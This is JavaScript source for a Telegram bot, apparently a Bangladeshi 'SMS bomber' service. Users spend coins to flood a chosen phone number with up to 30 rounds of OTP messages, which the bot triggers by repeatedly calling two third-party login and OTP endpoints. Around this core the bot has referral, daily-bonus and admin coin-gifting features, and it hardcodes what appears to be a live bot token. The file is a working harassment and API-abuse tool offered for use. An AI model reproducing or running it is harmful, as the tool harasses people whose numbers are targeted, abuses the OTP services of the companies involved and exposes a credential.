const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const http = require('http');

// --- কনফিগারেশন ---
const token = '8784762504:AAH4uP_glf7oKo52fiUiInsxOYheI0Mm-U8';
const adminId = '7225943533'; // আপনার আইডি (অ্যাডমিন)
const bot = new TelegramBot(token, {polling: true});

// ডাটাবেস লোড
const dbFile = 'users.json';
let users = {};
if (fs.existsSync(dbFile)) { users = JSON.parse(fs.readFileSync(dbFile)); }
function saveDB() { fs.writeFileSync(dbFile, JSON.stringify(users, null, 2)); }

http.createServer((req, res) => { res.write("S.R.M Admin Mode Active!"); res.end(); }).listen(process.env.PORT || 3000);

console.log("🚀 S.R.M TELECOM (Admin & Coin System) চালু হয়েছে...");

const mainMenu = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 শুরু করুন (Attack)' }, { text: '💰 প্রোফাইল ও কয়েন' }],
            [{ text: '🎁 ডেইলি বোনাস' }, { text: '🔗 রেফার করুন' }],
            [{ text: '📢 চ্যানেল' }]
        ],
        resize_keyboard: true
    }
};

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from.id.toString();

    // নতুন ইউজার রেজিস্টার
    if (!users[userId]) {
        users[userId] = { balance: 5, lastBonus: 0, step: '' };
        saveDB();
    }

    // --- ১. অ্যাডমিন স্পেশাল কমান্ড (Coin Gift) ---
    // ফরম্যাট: add 12345678 50 (মানে ১২৩৪৫৬৭৮ আইডিতে ৫০ কয়েন যাবে)
    if (userId === adminId && text && text.startsWith('add ')) {
        const parts = text.split(' ');
        if (parts.length === 3) {
            const targetId = parts[1];
            const amount = parseInt(parts[2]);
            if (users[targetId]) {
                users[targetId].balance += amount;
                saveDB();
                bot.sendMessage(chatId, `✅ সফল! ইউজার ${targetId}-কে ${amount} কয়েন দেওয়া হয়েছে।`);
                bot.sendMessage(targetId, `🎊 অ্যাডমিন আপনাকে **${amount} কয়েন** গিফট করেছেন! বর্তমান ব্যালেন্স: ${users[targetId].balance}`);
            } else {
                bot.sendMessage(chatId, "❌ এই ইউজার আইডিটি বটের ডাটাবেসে নেই।");
            }
        }
        return;
    }

    if (text === '/start' || text?.startsWith('/start ')) {
        let welcomeMsg = "🔥 **S.R.M TELECOM**\nপ্রতিটি অ্যাটাকে ১ কয়েন কাটবে।";
        if (userId === adminId) welcomeMsg += "\n\n👑 **স্বাগতম অ্যাডমিন!** আপনার জন্য আনলিমিটেড কয়েন সচল।\nইউজারকে কয়েন দিতে লিখুন: `add [ID] [Amount]`";
        return bot.sendMessage(chatId, welcomeMsg, { parse_mode: "Markdown", reply_markup: mainMenu.reply_markup });
    }

    // --- ২. প্রোফাইল ও কয়েন চেক ---
    if (text === '💰 প্রোফাইল ও কয়েন') {
        const balance = (userId === adminId) ? "Unlimited ♾" : users[userId].balance;
        return bot.sendMessage(chatId, `👤 **আপনার আইডি:** \`${userId}\`\n💰 **বর্তমান ব্যালেন্স:** ${balance}`, { parse_mode: "Markdown" });
    }

    // --- ৩. ডেইলি বোনাস (২ কয়েন) ---
    if (text === '🎁 ডেইলি বোনাস') {
        const now = Date.now();
        const cooldown = 24 * 60 * 60 * 1000;
        if (now - users[userId].lastBonus < cooldown) {
            return bot.sendMessage(chatId, "⏳ আপনি আজকে বোনাস নিয়েছেন! ২৪ ঘণ্টা পর আবার চেষ্টা করুন।");
        }
        users[userId].balance += 2;
        users[userId].lastBonus = now;
        saveDB();
        return bot.sendMessage(chatId, "✅ অভিনন্দন! আপনি **২ কয়েন** ডেইলি বোনাস পেয়েছেন।");
    }

    // --- ৪. রেফারাল সিস্টেম ---
    if (text === '🔗 রেফার করুন') {
        const refLink = `https://t.me/srmtelecombot?start=${userId}`;
        return bot.sendMessage(chatId, `🔗 **আপনার রেফার লিঙ্ক:**\n${refLink}\n\nপ্রতিটি রেফারে পাবেন **১ কয়েন**!`);
    }

    // --- ৫. অ্যাটাক সিস্টেম (কয়েন কাটার লজিক) ---
    if (text === '🚀 শুরু করুন (Attack)') {
        if (userId !== adminId && users[userId].balance < 1) {
            return bot.sendMessage(chatId, "❌ আপনার কয়েন শেষ! ডেইলি বোনাস নিন বা রেফার করুন।");
        }
        users[userId].step = 'get_num';
        saveDB();
        return bot.sendMessage(chatId, "📱 **টার্গেট নম্বরটি দিন (১১ ডিজিট):**", { reply_markup: { remove_keyboard: true } });
    }

    if (users[userId]?.step === 'get_num' && text.length === 11) {
        users[userId].target = text;
        users[userId].step = 'get_amount';
        saveDB();
        return bot.sendMessage(chatId, "🔢 **কয়টি SMS পাঠাতে চান? (১-৩০)**");
    }

    if (users[userId]?.step === 'get_amount') {
        const amount = parseInt(text);
        if (isNaN(amount) || amount > 30) return bot.sendMessage(chatId, "⚠️ সর্বোচ্চ ৩০টি দিন।");
        
        const target = users[userId].target;
        
        // অ্যাডমিন ছাড়া সবার ১ কয়েন কাটবে
        if (userId !== adminId) {
            users[userId].balance -= 1;
        }
        
        users[userId].step = '';
        saveDB();

        bot.sendMessage(chatId, `🚀 **${target}** নম্বরে অ্যাটাক চলছে...\n💰 বর্তমান ব্যালেন্স: ${userId === adminId ? "Unlimited" : users[userId].balance}`, mainMenu);

        // ওটিপি লুপ
        for (let i = 0; i < amount; i++) {
            try { await axios.get(`https://apibeta.iqra-live.com/api/v2/sent-otp/${target}`); } catch (e) {}
            try { await axios.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', { mobile: target }); } catch (e) {}
            await new Promise(r => setTimeout(r, 4000));
        }
        bot.sendMessage(chatId, `✅ **মিশন সম্পন্ন!**\n🎯 টার্গেট: ${target}`, mainMenu);
    }
});
